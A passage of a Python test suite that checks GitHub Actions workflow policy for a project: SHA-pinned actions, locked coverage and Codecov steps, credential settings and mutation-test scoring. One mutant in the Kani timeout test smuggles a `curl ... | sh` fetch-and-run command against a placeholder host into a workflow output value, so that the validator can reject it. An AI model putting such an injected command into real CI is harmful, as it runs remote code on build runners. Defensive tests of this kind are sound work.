            4,
        )
        checkout = text.replace(
            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7",
            "actions/checkout@v7",
            1,
        )
        self.assertNotEqual(checkout, text)
        checkout_violations = kani_action_sha_violations(checkout, path="kani.yml")
        self.assertTrue(checkout_violations)
        self.assertIn("actions/checkout@v7", checkout_violations[0])
        self.assertIn(KANI_ACTION_SHA_MSG, checkout_violations[0])
        upload = text.replace(
            "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2",
            "actions/upload-artifact@v7",
            1,
        )
        self.assertNotEqual(upload, text)
        upload_violations = kani_action_sha_violations(upload, path="kani.yml")
        self.assertTrue(upload_violations)
        self.assertIn("actions/upload-artifact@v7", upload_violations[0])
        self.assertIn(KANI_ACTION_SHA_MSG, upload_violations[0])

    def test_codecov_files_path_is_pinned(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(codecov_explicit_file_violations(text, path="coverage.yml"), [])
        self.assertEqual(codecov_explicit_file_violations(editor, path="aw-editor-tests.yml"), [])
        xml = text.replace(
            "files: ./tools/astraweave-assets/coverage/cobertura.xml",
            "files: ./tools/astraweave-assets/coverage-html/index.html",
            1,
        )
        self.assertNotEqual(xml, text)
        self.assertIn(
            CODECOV_FILES_PIN_MSG,
            codecov_explicit_file_violations(xml, path="coverage.yml")[0],
        )
        lcov = editor.replace("files: ./lcov.info", "files: ./other.info", 1)
        self.assertNotEqual(lcov, editor)
        self.assertIn(
            CODECOV_FILES_PIN_MSG,
            codecov_explicit_file_violations(lcov, path="aw-editor-tests.yml")[0],
        )

    def test_codecov_step_keys_reject_if(self) -> None:
        """An if: on the Codecov step is not name, uses, or with."""
        workflows = {
            "coverage.yml": (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8"),
            "aw-editor-tests.yml": (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8"),
        }
        conditions = ("false", "${{ false }}", "failure()")
        for path, text in workflows.items():
            self.assertEqual(codecov_with_key_violations(text, path=path), [], path)
            for condition in conditions:
                mutant = text.replace(
                    "uses: codecov/codecov-action@",
                    f"if: {condition}\n        uses: codecov/codecov-action@",
                    1,
                )
                if path == "aw-editor-tests.yml":
                    mutant = text.replace(
                        "uses: codecov/codecov-action@",
                        f"if: {condition}\n      uses: codecov/codecov-action@",
                        1,
                    )
                self.assertNotEqual(mutant, text, (path, condition))
                messages = " ".join(codecov_with_key_violations(mutant, path=path))
                self.assertIn(CODECOV_STEP_KEYS_MSG, messages, (path, condition))
                self.assertNotIn(CODECOV_WITH_MSG, messages, (path, condition))

    def test_codecov_upload_job_key_mutant_is_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        mutant = text.replace(
            "    timeout-minutes: 10\n",
            "    timeout-minutes: 10\n    container: alpine\n",
            1,
        )
        self.assertNotEqual(mutant, text)
        messages = " ".join(coverage_permission_violations(mutant, path="coverage.yml"))
        self.assertIn(UPLOAD_JOB_KEYS_MSG, messages)

    def test_codecov_untrusted_on_event_is_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        start = text.index("\non:\n")
        end = text.index("\nconcurrency:", start)
        mutant = text[:start] + "\non:\n  pull_request_target:\n" + text[end:]
        self.assertNotEqual(mutant, text)
        self.assertTrue(codecov_trigger_violations(mutant, path="coverage.yml"))

    def test_policy_actions_matches_expected_set(self) -> None:
        self.assertEqual(set(POLICY_ACTIONS), EXPECTED_POLICY_ACTIONS)

    def test_policy_actions_have_floors_and_uses_regex(self) -> None:
        self.assertEqual(ACTION_MAJOR_FLOORS, PINNED_ACTION_MAJOR_FLOORS)
        self.assertEqual(set(ACTION_MAJOR_FLOORS), set(POLICY_ACTIONS))
        for action in POLICY_ACTIONS:
            violations = workflow_action_pin_violations(f"uses: {action}@main")
            self.assertEqual(len(violations), 1, action)
            self.assertIn(UNPINNED_REF_MSG, violations[0])
            match = ACTION_USES_RE.search(f"uses: {action}@v99")
            self.assertIsNotNone(match, action)
            self.assertEqual(match.group("action"), action)
            below = BELOW_FLOOR_MAJOR_TAG_BY_ACTION[action]
            at_floor = AT_FLOOR_MAJOR_TAG_BY_ACTION[action]
            self.assertIn(BELOW_FLOOR_MSG, action_ref_violation(action, below) or "", action)
            self.assertIsNone(action_ref_violation(action, at_floor), action)

    def test_action_ref_rejects_unpinned_branch(self) -> None:
        violations = workflow_action_pin_violations("uses: actions/checkout@main\n")
        self.assertTrue(violations)
        self.assertIn(UNPINNED_REF_MSG, violations[0])

    def test_action_ref_rejects_non_sha_semver_tag(self) -> None:
        violations = workflow_action_pin_violations("uses: actions/upload-artifact@v4.3.0\n")
        self.assertTrue(violations)
        self.assertIn(NON_SHA_TAG_MSG, violations[0])

    def test_action_ref_rejects_major_below_floor(self) -> None:
        for ref in ("v4", "v5", "v6"):
            violations = workflow_action_pin_violations(f"uses: actions/checkout@{ref}\n")
            self.assertTrue(violations, ref)
            self.assertIn(BELOW_FLOOR_MSG, violations[0], ref)
        for action, below in BELOW_FLOOR_MAJOR_TAG_BY_ACTION.items():
            violations = workflow_action_pin_violations(f"uses: {action}@{below}\n")
            self.assertTrue(violations, action)
            self.assertIn(BELOW_FLOOR_MSG, violations[0], action)

    def test_action_ref_accepts_sha_and_major_tags(self) -> None:
        self.assertIsNone(
            action_ref_violation(
                "actions/checkout",
                "3d3c42e5aac5ba805825da76410c181273ba90b1",
            )
        )
        self.assertIsNone(action_ref_violation("actions/checkout", "v7"))
        self.assertIsNone(action_ref_violation("actions/github-script", "v8"))

    def test_action_ref_rejects_malformed_sha(self) -> None:
        bad_refs = (
            "a" * 39,
            "a" * 41,
            "3d3c42e",
            "ABCDEF0123456789ABCDEF0123456789ABCDEF01",
            "0" * 39 + "g",
        )
        for ref in bad_refs:
            violations = workflow_action_pin_violations(f"uses: actions/checkout@{ref}\n")
            self.assertTrue(violations, ref)
            self.assertIn(NON_SHA_TAG_MSG, violations[0], ref)

    def test_mutation_ai_scoring_uses_strict_eval(self) -> None:
        text = mutation_testing_text()
        assert_mutation_ai_scoring_uses_strict_eval(text)
        loose = text.replace(
            'counts=$(python3 scripts/ci/mutation_ai_outcomes.py "${ai_files[@]}") || exit 1',
            'eval "$(python3 scripts/ci/mutation_ai_outcomes.py "${ai_files[@]}")"',
            1,
        )
        with self.assertRaises(AssertionError):
            assert_mutation_ai_scoring_uses_strict_eval(loose)

    def test_mutation_ai_outcomes_excludes_cap_oom_from_caught(self) -> None:
        root = ROOT / "scripts" / "ci" / "testdata" / "mutation_ai_cap_oom"
        counts = mutation_ai_outcomes.count_outcomes(root / "outcomes.json")
        self.assertEqual(counts.cap_oom, 1)
        self.assertEqual(counts.caught, 0)
        self.assertEqual(counts.decided, 0)

    def test_mutation_ai_outcomes_counts_real_caught(self) -> None:
        root = ROOT / "scripts" / "ci" / "testdata" / "mutation_ai_real_caught"
        counts = mutation_ai_outcomes.count_outcomes(root / "outcomes.json")
        self.assertEqual(counts.caught, 1)
        self.assertEqual(counts.cap_oom, 0)
        self.assertEqual(counts.score_percent, 100)

    def test_mutation_ai_outcomes_verify_shard_requires_baseline_and_mutants(self) -> None:
        root = ROOT / "scripts" / "ci" / "testdata" / "mutation_ai_real_caught"
        self.assertEqual(mutation_ai_outcomes.verify_shard_outcomes(root / "outcomes.json"), [])

        missing = mutation_ai_outcomes.verify_shard_outcomes(root / "missing.json")
        self.assertTrue(missing)
        self.assertIn("missing outcomes", missing[0])

        baseline_failure = ROOT / "scripts" / "ci" / "testdata" / "mutation_ai_baseline_failure"
        errors = mutation_ai_outcomes.verify_shard_outcomes(baseline_failure / "outcomes.json")
        self.assertIn(VERIFY_BASELINE_ERROR, errors)

        baseline_only = ROOT / "scripts" / "ci" / "testdata" / "mutation_ai_baseline_only"
        errors = mutation_ai_outcomes.verify_shard_outcomes(baseline_only / "outcomes.json")
        self.assertIn(VERIFY_NO_MUTANTS_ERROR, errors)

    def test_mutation_ai_outcomes_verify_shard_rejects_unfinished(self) -> None:
        root = ROOT / "scripts" / "ci" / "testdata" / "mutation_ai_unfinished"
        errors = mutation_ai_outcomes.verify_shard_outcomes(root / "outcomes.json")
        self.assertTrue(any(VERIFY_END_TIME_ERROR in err for err in errors))
        self.assertTrue(any(VERIFY_INCOMPLETE_ERROR in err for err in errors))
        exit_code = mutation_ai_outcomes.main(
            ["--verify-shard", str(root / "outcomes.json")]
        )
        self.assertEqual(exit_code, 1)

    def test_mutation_ai_verify_errors_are_required(self) -> None:
        source = (ROOT / "scripts" / "ci" / "mutation_ai_outcomes.py").read_text(encoding="utf-8")
        self.assertIn(VERIFY_BASELINE_ERROR, source)
        self.assertIn(VERIFY_NO_MUTANTS_ERROR, source)
        self.assertIn(VERIFY_END_TIME_ERROR, source)
        self.assertIn(VERIFY_INCOMPLETE_ERROR, source)
        stripped = source.replace(f'errors.append("{VERIFY_BASELINE_ERROR}")', "", 1)
        with self.assertRaises(AssertionError):
            self.assertIn(VERIFY_BASELINE_ERROR, stripped)
        stripped = source.replace(f'errors.append("{VERIFY_NO_MUTANTS_ERROR}")', "", 1)
        with self.assertRaises(AssertionError):
            self.assertIn(VERIFY_NO_MUTANTS_ERROR, stripped)

    def test_benchmark_alert_issue_runs_after_failed_regression_check(self) -> None:
        alert = (WORKFLOWS / "benchmark_alert.yml").read_text(encoding="utf-8")
        check = job_step_block(alert, "Check for regressions")
        if "continue-on-error" in check:
            raise AssertionError("regression_check must fail the job")
        if "shell: pwsh" not in check:
            raise AssertionError("regression_check must stay shell: pwsh")
        body = pwsh_run_body(check)
        if "-Strict" not in body:
            raise AssertionError("benchmark_alert regression check lost -Strict")
        if "exit 0" in body:
            raise AssertionError("regression_check must stay red; do not exit 0")

        strict = job_step_block(
            (WORKFLOWS / "benchmark.yml").read_text(encoding="utf-8"),
            "Strict threshold validation (main branch only)",
        )
        if "-Strict" not in strict:
            raise AssertionError("benchmark.yml -Strict was changed")
        if "continue-on-error" in strict:
            raise AssertionError("benchmark.yml strict step must not continue on error")

        code, output, report = run_alert_check_in_runner(body, "regression")
        self.assertNotEqual(code, 0)
        self.assertIn("has_regressions=true", output)
        self.assertTrue(report)

        code, output, report = run_alert_check_in_runner(body, "clean")
        self.assertEqual(code, 0)
        self.assertIn("has_regressions=false", output)
        self.assertFalse(report)

        code, _output, _report = run_alert_check_in_runner(body, "checker_error")
        self.assertNotEqual(code, 0)

        assert_alert_followup_runs(alert)
        mutant = alert
        for name in _ALERT_ISSUE_STEPS:
            expr = step_if_expression(job_step_block(mutant, name))
            stripped = without_status_guard(expr)
            self.assertNotEqual(stripped, expr)
            self.assertFalse(
                github_step_if_runs(
                    stripped,
                    failed=True,
                    cancelled=False,
                    outputs={("regression_check", "has_regressions"): "true"},
                )
            )
            mutant = mutant.replace(expr, stripped, 1)
        with self.assertRaises(AssertionError):
            assert_alert_followup_runs(mutant)

    def _coverage_job(self, text: str, path: str) -> dict:
        doc, err = load_workflow_yaml(text)
        self.assertIsNone(err, path)
        job = doc["jobs"]["coverage"]
        self.assertIsInstance(job, dict, path)
        return job

    def _assert_producer_rejected(self, text: str, path: str, label: str) -> dict:
        self.assertNotEqual(text, (WORKFLOWS / path).read_text(encoding="utf-8"), label)
        job = self._coverage_job(text, f"{path}:{label}")
        messages = " ".join(coverage_permission_violations(text, path=path))
        self.assertIn(COVERAGE_JOB_END_MSG, messages, f"{path}:{label}")
        return job

    def test_locked_steps_equal_their_canonical_steps(self) -> None:
        """Live locked steps match the canonical key set and values."""
        coverage = self._coverage_job(
            (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8"),
            "coverage.yml",
        )
        editor = self._coverage_job(
            (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8"),
            "aw-editor-tests.yml",
        )
        for workflow, job in (("coverage.yml", coverage), ("aw-editor-tests.yml", editor)):
            kinds = _PRODUCER_STEP_KINDS[workflow]
            self.assertEqual(len(job["steps"]), len(kinds), workflow)
            self.assertEqual(set(_LOCKED_PRODUCER_STEPS[workflow]), set(kinds), workflow)
            for step, kind in zip(job["steps"], kinds):
                canonical = _LOCKED_PRODUCER_STEPS[workflow][kind]
                self.assertTrue(
                    _step_equals_canonical(step, canonical),
                    f"{workflow}:{kind}",
                )
            self.assertTrue(_producer_permissions_exact(job), workflow)
        for name in ("coverage.yml", "aw-editor-tests.yml", "kani.yml"):
            text = (WORKFLOWS / name).read_text(encoding="utf-8")
            doc, err = load_workflow_yaml(text)
            self.assertIsNone(err, name)
            canonical = _CHECKOUT_CANONICAL[name]
            seen = 0
            for _job_id, _job, step in _iter_steps(doc):
                if not _is_named_action(step, "actions/checkout"):
                    continue
                seen += 1
                self.assertTrue(_step_equals_canonical(step, canonical), f"{name}:{seen}")
            self.assertGreater(seen, 0, name)
        kani, kani_err = load_workflow_yaml((WORKFLOWS / "kani.yml").read_text(encoding="utf-8"))
        self.assertIsNone(kani_err)
        timeouts = [
            step
            for _job_id, _job, step in _iter_steps(kani)
            if step.get("id") == "timeout"
        ]
        self.assertEqual(len(timeouts), 4)
        for step in timeouts:
            self.assertTrue(_step_equals_canonical(step, _KANI_TIMEOUT_STEP))

    def test_locked_steps_reject_an_extra_key_and_run_line(self) -> None:
        """Each locked step rejects an extra key and an extra run line.

        The extra key keeps the approved run text, so a run-only compare
        accepts it. The extra run line keeps the canonical key set, so a
        key-set compare accepts it.
        """
        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        kani = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        cases = (
            (
                "coverage install",
                "coverage.yml",
                coverage,
                "      - name: Install cargo-tarpaulin\n"
                "        run: cargo install cargo-tarpaulin --version 0.35.2 --locked\n"
                "      \n"
                "      - name: Generate coverage\n",
                "      - name: Install cargo-tarpaulin\n"
                "        shell: bash\n"
                "        run: cargo install cargo-tarpaulin --version 0.35.2 --locked\n"
                "      \n"
                "      - name: Generate coverage\n",
                "      - name: Install cargo-tarpaulin\n"
                "        run: |\n"
                "          cargo install cargo-tarpaulin --version 0.35.2 --locked\n"
                "          echo extra\n"
                "      \n"
                "      - name: Generate coverage\n",
                "install-tarpaulin",
            ),
            (
                "generate",
                "coverage.yml",
                coverage,
                "      - name: Generate coverage\n"
                "        run: |\n"
                "          cd tools/astraweave-assets\n"
                "          cargo tarpaulin --out Xml --output-dir coverage "
                "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n",
                "      - name: Generate coverage\n"
                "        shell: bash\n"
                "        run: |\n"
                "          cd tools/astraweave-assets\n"
                "          cargo tarpaulin --out Xml --output-dir coverage "
                "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n",
                "      - name: Generate coverage\n"
                "        run: |\n"
                "          cd tools/astraweave-assets\n"
                "          cargo tarpaulin --out Xml --output-dir coverage "
                "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n"
                "          echo extra\n",
                "xml-tarpaulin",
            ),
            (
                "upload",
                "coverage.yml",
                coverage,
                "      - name: Upload coverage XML\n"
                "        uses: actions/upload-artifact@"
                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
                "      - name: Upload coverage XML\n"
                "        shell: bash\n"
                "        uses: actions/upload-artifact@"
                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
                "      - name: Upload coverage XML\n"
                "        run: echo extra\n"
                "        uses: actions/upload-artifact@"
                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
                "upload",
            ),
            (
                "editor upload",
                "aw-editor-tests.yml",
                editor,
                "    - name: Upload coverage report\n"
                "      uses: actions/upload-artifact@"
                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
                "    - name: Upload coverage report\n"
                "      shell: bash\n"
                "      uses: actions/upload-artifact@"
                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
                "    - name: Upload coverage report\n"
                "      run: echo extra\n"
                "      uses: actions/upload-artifact@"
                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
                "upload",
            ),
            (
                "apt",
                "aw-editor-tests.yml",
                editor,
                "    - name: Install Linux Dependencies\n"
                "      run: |\n"
                "        sudo apt-get update\n"
                "        sudo apt-get install -y pkg-config libxcb-shape0-dev "
                "libxcb-xfixes0-dev libxkbcommon-dev libegl1-mesa-dev "
                "libudev-dev libasound2-dev\n",
                "    - name: Install Linux Dependencies\n"
                "      shell: bash\n"
                "      run: |\n"
                "        sudo apt-get update\n"
                "        sudo apt-get install -y pkg-config libxcb-shape0-dev "
                "libxcb-xfixes0-dev libxkbcommon-dev libegl1-mesa-dev "
                "libudev-dev libasound2-dev\n",
                "    - name: Install Linux Dependencies\n"
                "      run: |\n"
                "        sudo apt-get update\n"
                "        sudo apt-get install -y pkg-config libxcb-shape0-dev "
                "libxcb-xfixes0-dev libxkbcommon-dev libegl1-mesa-dev "
                "libudev-dev libasound2-dev\n"
                "        echo extra\n",
                "apt",
            ),
            (
                "install-llvm",
                "aw-editor-tests.yml",
                editor,
                "    - name: Install cargo-llvm-cov\n"
                "      run: cargo install cargo-llvm-cov --version 0.9.1 --locked\n",
                "    - name: Install cargo-llvm-cov\n"
                "      shell: bash\n"
                "      run: cargo install cargo-llvm-cov --version 0.9.1 --locked\n",
                "    - name: Install cargo-llvm-cov\n"
                "      run: |\n"
                "        cargo install cargo-llvm-cov --version 0.9.1 --locked\n"
                "        echo extra\n",
                "install-llvm",
            ),
            (
                "llvm-cov",
                "aw-editor-tests.yml",
                editor,
                "    - name: Generate Coverage Report\n"
                "      run: |\n"
                "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n",
                "    - name: Generate Coverage Report\n"
                "      shell: bash\n"
                "      run: |\n"
                "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n",
                "    - name: Generate Coverage Report\n"
                "      run: |\n"
                "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n"
                "        echo TN: > lcov.info\n",
                "llvm-cov",
            ),
        )
        for label, path, text, anchor, extra_key, extra_run, kind in cases:
            self.assertEqual(text.count(anchor), 1, label)
            keyed = text.replace(anchor, extra_key, 1)
            job = self._assert_producer_rejected(keyed, path, f"{label}:key")
            step = next(
                item
                for item, step_kind in zip(job["steps"], _PRODUCER_STEP_KINDS[path])
                if step_kind == kind
            )
            self.assertIn("shell", step, label)
            canonical = _LOCKED_PRODUCER_STEPS[path][kind]
            self.assertEqual(_run_rstrip(step.get("run")), _run_rstrip(canonical.get("run")), label)
            self.assertFalse(_step_equals_canonical(step, canonical), label)
            lined = text.replace(anchor, extra_run, 1)
            job = self._assert_producer_rejected(lined, path, f"{label}:run")
            step = next(
                item
                for item, step_kind in zip(job["steps"], _PRODUCER_STEP_KINDS[path])
                if step_kind == kind
            )
            self.assertNotIn("shell", step, label)
            self.assertNotEqual(
                _run_rstrip(step.get("run")),
                _run_rstrip(canonical.get("run")),
                label,
            )

    def test_upload_and_checkout_with_values_are_exact(self) -> None:
        """A changed or extra with: value fails on the upload and the checkout."""
        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        kani = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        changed_path = coverage.replace(
            "          path: tools/astraweave-assets/coverage/cobertura.xml\n",
            "          path: README.md\n",
            1,
        )
        job = self._assert_producer_rejected(changed_path, "coverage.yml", "upload path")
        upload = job["steps"][-1]
        self.assertEqual(_ci_item(upload.get("with"), "name")[1], "coverage-xml")
        self.assertEqual(_ci_item(upload.get("with"), "path")[1], "README.md")
        self.assertTrue(_producer_upload_name_ok(job, "coverage-xml"))
        self.assertFalse(_step_equals_canonical(upload, _COVERAGE_UPLOAD_STEP))
        ignored = coverage.replace(
            "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
            "          retention-days: 30\n",
            "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
            "          if-no-files-found: ignore\n"
            "          retention-days: 30\n",
            1,
        )
        job = self._assert_producer_rejected(ignored, "coverage.yml", "upload ignore")
        upload = job["steps"][-1]
        self.assertIn("if-no-files-found", upload.get("with"))
        self.assertTrue(_producer_upload_name_ok(job, "coverage-xml"))
        editor_path = editor.replace("        path: lcov.info\n", "        path: README.md\n", 1)
        job = self._assert_producer_rejected(editor_path, "aw-editor-tests.yml", "editor path")
        self.assertEqual(_ci_item(job["steps"][-1].get("with"), "path")[1], "README.md")
        self.assertTrue(_producer_upload_name_ok(job, "aw-editor-lcov"))
        checkout_forms = {
            "coverage.yml": (
                coverage,
                "        with:\n          persist-credentials: false\n",
                "        with:\n"
                "          persist-credentials: false\n"
                "          repository: example/astraweave\n"
                "          ref: main\n"
                "          token: ${{ secrets.GITHUB_TOKEN }}\n",
            ),
            "aw-editor-tests.yml": (
                editor,
                "      with:\n        persist-credentials: false\n",
                "      with:\n"
                "        persist-credentials: false\n"
                "        repository: example/astraweave\n"
                "        ref: main\n"
                "        token: ${{ secrets.GITHUB_TOKEN }}\n",
            ),
            "kani.yml": (
                kani,
                "        with:\n          persist-credentials: false\n",
                "        with:\n"
                "          persist-credentials: false\n"
                "          repository: example/astraweave\n"
                "          ref: main\n"
                "          token: ${{ secrets.GITHUB_TOKEN }}\n",
            ),
        }
        for path, (text, checkout_anchor, extra_with) in checkout_forms.items():
            self.assertGreaterEqual(text.count(checkout_anchor), 1, path)
            mutant = text.replace(checkout_anchor, extra_with, 1)
            self.assertNotEqual(mutant, text, path)
            violations = checkout_persist_credentials_violations(mutant, path=path)
            self.assertTrue(violations, path)
            self.assertIn(CHECKOUT_STEP_MSG, " ".join(violations), path)
            self.assertNotIn(CHECKOUT_PERSIST_MSG, " ".join(violations), path)
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, path)
            step = next(
                item
                for _job_id, _job, item in _iter_steps(doc)
                if _is_named_action(item, "actions/checkout")
            )
            body = step.get("with")
            self.assertEqual(
                sorted(body),
                ["persist-credentials", "ref", "repository", "token"],
                path,
            )
            self.assertFalse(_step_equals_canonical(step, _CHECKOUT_CANONICAL[path]), path)

    def test_checkout_and_timeout_reject_an_extra_key_and_run_line(self) -> None:
        """Checkout and the Kani timeout step reject an extra key and a run line."""
        kani = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        checkout = (
            "      - uses: actions/checkout@"
            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "        with:\n"
            "          persist-credentials: false\n"
        )
        self.assertEqual(kani.count(checkout), 4)
        keyed = kani.replace(
            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n        with:\n",
            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n        shell: bash\n        with:\n",
            1,
        )
        self.assertNotEqual(keyed, kani)
        keyed_violations = checkout_persist_credentials_violations(keyed, path="kani.yml")
        self.assertIn(CHECKOUT_STEP_MSG, " ".join(keyed_violations))
        self.assertNotIn(CHECKOUT_PERSIST_MSG, " ".join(keyed_violations))
        lined = kani.replace(
            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n        with:\n",
            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "        run: echo extra\n"
            "        with:\n",
            1,
        )
        self.assertNotEqual(lined, kani)
        lined_violations = checkout_persist_credentials_violations(lined, path="kani.yml")
        self.assertIn(CHECKOUT_STEP_MSG, " ".join(lined_violations))
        doc, err = load_workflow_yaml(lined)
        self.assertIsNone(err)
        step = next(
            item
            for _job_id, _job, item in _iter_steps(doc)
            if _is_named_action(item, "actions/checkout")
        )
        self.assertEqual(step.get("run"), "echo extra")
        timeout = (
            "      - name: Resolve harness timeout\n"
            "        id: timeout\n"
            "        env:\n"
            "          KANI_TIMEOUT_INPUT: ${{ github.event.inputs.timeout }}\n"
            "        run: |\n"
        )
        self.assertEqual(kani.count(timeout), 4)
        timeout_key = kani.replace(
            timeout,
            timeout.replace("        id: timeout\n", "        id: timeout\n        shell: bash\n", 1),
            1,
        )
        self.assertNotEqual(timeout_key, kani)
        key_doc, key_err = load_workflow_yaml(timeout_key)
        self.assertIsNone(key_err)
        key_step = next(item for _a, _b, item in _iter_steps(key_doc) if item.get("id") == "timeout")
        self.assertIn("shell", key_step)
        self.assertEqual(key_step.get("run"), _KANI_TIMEOUT_RUN)
        self.assertFalse(_step_equals_canonical(key_step, _KANI_TIMEOUT_STEP))
        key_violations = kani_timeout_run_violations(timeout_key, path="kani.yml")
        self.assertEqual(len(key_violations), 1)
        self.assertIn(KANI_TIMEOUT_MSG, key_violations[0])
        needle = '          echo "value=$raw" >> "$GITHUB_OUTPUT"\n'
        timeout_run = kani.replace(
            needle,
            needle + '          echo "value=300; curl https://example.invalid/x|sh" >> "$GITHUB_OUTPUT"\n',
            1,
        )
        self.assertNotEqual(timeout_run, kani)
        run_doc, run_err = load_workflow_yaml(timeout_run)
        self.assertIsNone(run_err)
        run_step = next(item for _a, _b, item in _iter_steps(run_doc) if "curl" in _run_text(item))
        self.assertEqual(set(run_step), set(_KANI_TIMEOUT_STEP))
        self.assertNotEqual(_run_rstrip(run_step.get("run")), _run_rstrip(_KANI_TIMEOUT_RUN))
        run_violations = kani_timeout_run_violations(timeout_run, path="kani.yml")
        self.assertEqual(len(run_violations), 1)
        self.assertIn(KANI_TIMEOUT_MSG, run_violations[0])

    def test_producer_step_count_rejects_a_second_pinned_upload(self) -> None:
        """Extra steps plus a second upload with the pinned name fail the length check.

        The prefix still matches each canonical step, and the last step's
        name is still the pinned report. Removing the step-count compare
        makes this test fail.
        """
        shapes = {
            "coverage.yml": (
                "          retention-days: 30\n\n  codecov:\n",
                "          retention-days: 30\n"
                "\n"
                "      - name: Extra producer step\n"
                "        run: echo extra\n"
                "\n"
                "      - name: Second report upload\n"
                "        uses: actions/upload-artifact@"
                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n"
                "        with:\n"
                "          name: coverage-xml\n"
                "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
                "          retention-days: 30\n"
                "\n"
                "  codecov:\n",
                "coverage-xml",
            ),
            "aw-editor-tests.yml": (
                "        retention-days: 30\n\n  codecov:\n",
                "        retention-days: 30\n"
                "\n"
                "    - name: Extra producer step\n"
                "      run: echo extra\n"
                "\n"
                "    - name: Second report upload\n"
                "      uses: actions/upload-artifact@"
                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n"
                "      with:\n"
                "        name: aw-editor-lcov\n"
                "        path: lcov.info\n"
                "        retention-days: 30\n"
                "\n"
                "  codecov:\n",
                "aw-editor-lcov",
            ),
        }
        for path, (anchor, replacement, artifact) in shapes.items():
            text = (WORKFLOWS / path).read_text(encoding="utf-8")
            self.assertEqual(text.count(anchor), 1, path)
            mutant = text.replace(anchor, replacement, 1)
            job = self._assert_producer_rejected(mutant, path, "step count")
            kinds = _PRODUCER_STEP_KINDS[path]
            self.assertGreater(len(job["steps"]), len(kinds), path)
            self.assertTrue(
                all(
                    _producer_step_matches(step, kind)
                    for step, kind in zip(job["steps"], kinds)
                ),
                path,
            )
            self.assertTrue(_producer_locked_exact(job["steps"], path), path)
            self.assertTrue(_producer_upload_name_ok(job, artifact), path)
            self.assertTrue(_producer_steps_unconditional(job), path)
            self.assertTrue(_producer_job_keys_ok(job), path)
            self.assertFalse(_producer_sequence_ok(job, path), path)

    def test_llvm_cov_kind_rejects_a_replaced_editor_step(self) -> None:
        """The llvm-cov kind check is the cargo llvm-cov prefix.

        Returning True for every step fails the negative assertion.
        Deleting the branch fails the positive assertion. The step count
        and the pinned upload name stay, so this is not the length check.
        """
        text = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        live = self._coverage_job(text, "aw-editor-tests.yml")
        kinds = _PRODUCER_STEP_KINDS["aw-editor-tests.yml"]
        live_step = next(
            step for step, kind in zip(live["steps"], kinds) if kind == "llvm-cov"
        )
        self.assertTrue(_producer_step_matches(live_step, "llvm-cov"))
        anchor = (
            "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n"
        )
        self.assertEqual(text.count(anchor), 1)
        mutant = text.replace(anchor, "        echo not-llvm-cov\n", 1)
        job = self._assert_producer_rejected(mutant, "aw-editor-tests.yml", "llvm-cov kind")
        self.assertEqual(len(job["steps"]), len(kinds))
        step = next(item for item, kind in zip(job["steps"], kinds) if kind == "llvm-cov")
        self.assertFalse(_run_text(step).lstrip().startswith("cargo llvm-cov"))
        self.assertFalse(_producer_step_matches(step, "llvm-cov"))
        self.assertTrue(_producer_upload_name_ok(job, "aw-editor-lcov"))
        self.assertFalse(_producer_sequence_ok(job, "aw-editor-tests.yml"))

    def test_producer_permissions_reject_an_added_read_scope(self) -> None:
        """An added read scope on the producer job is flagged.

        The write check does not see it. Removing or changing contents: read
        is flagged by the same exact map.
        """
        added = {
            "coverage.yml": (
                "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
                "      contents: read\n",
                "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
                "      contents: read\n"
                "      actions: read\n",
            ),
            "aw-editor-tests.yml": (
                "  coverage:\n    name: Test Coverage\n    permissions:\n"
                "      contents: read\n",
                "  coverage:\n    name: Test Coverage\n    permissions:\n"
                "      contents: read\n"
                "      pull-requests: read\n",
            ),
        }
        for path, (anchor, replacement) in added.items():
            text = (WORKFLOWS / path).read_text(encoding="utf-8")
            self.assertEqual(text.count(anchor), 1, path)
